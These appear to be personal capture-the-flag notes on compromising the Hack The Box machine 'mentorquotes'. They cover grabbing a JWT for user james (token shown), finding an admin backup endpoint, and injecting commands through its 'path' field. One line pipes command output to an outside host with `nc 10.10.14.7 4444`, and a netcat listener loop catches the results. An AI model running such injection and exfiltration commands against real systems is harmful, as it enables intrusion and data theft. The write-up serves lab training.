Using the API documentation at http://api.mentorquotes.htb/redoc, grabbed valid JWT for user `james`
![[Pasted image 20240904203532.png]]
```JWT
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

Discovered accounts 
![[Pasted image 20240904203804.png]]
![[Pasted image 20240904203812.png]]

Going to `/admin`
![[Pasted image 20240904204003.png]]
We now have 2 directories under `/admin` -` /check` & `/backup`

- check
![[Pasted image 20240905142417.png]]
- backup
GET /backup
![[Pasted image 20240905142452.png]]
So, switched to POST
![[Pasted image 20240905142509.png]]
Now it says unprocessable entity which means it expects other key:value in request parameter

Sending the below request
```json
{
  "body": "",
  "path": ""
}
```
![[Pasted image 20240905142619.png]]

We get "INFO":"Done!"
- Entered command
![[Pasted image 20240905142807.png]]
- Managed to capture ICMP traffic using `tcpdump`
![[Pasted image 20240905142834.png]]
- Attempting to get reverse shell, but it seems to be disconnecting right away
![[Pasted image 20240905142918.png]]
![[Pasted image 20240905142953.png]]

- Output redirection
![[Pasted image 20240905150754.png]]
![[Pasted image 20240905150801.png]]

Using the same technique, ran `id | nc -nv 10.10.14.7 4444;`
![[Pasted image 20240905150841.png]]
Turns out we are actually root on this machine

- Started a netcat loop to listen in on all output redirects on port 4444
```bash
while true; do
  nc -nlvp 4444
done
```

